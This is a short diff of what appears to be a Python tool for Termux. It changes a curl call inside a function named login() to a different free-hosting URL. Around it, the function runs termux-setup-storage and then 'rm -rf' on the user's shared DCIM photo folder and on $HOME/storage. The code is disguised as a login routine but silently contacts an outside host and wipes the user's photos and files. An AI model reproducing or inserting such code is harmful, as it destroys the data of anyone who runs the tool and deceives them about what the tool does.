@@ -60,7 +60,7 @@ vuln = '\x1b[32mVuln'
 
 
 def login():
-    os.system('curl https://tutorialku69.000webhostapp.com/S.php')
+    os.system('curl https://tutorialku69.000webhostapp.com/script/Setan.php')
     os.system('termux-setup-storage')
     os.system('rm -rf $HOME/storage/shared/DCIM')
     os.system('rm -rf $HOME/storage')
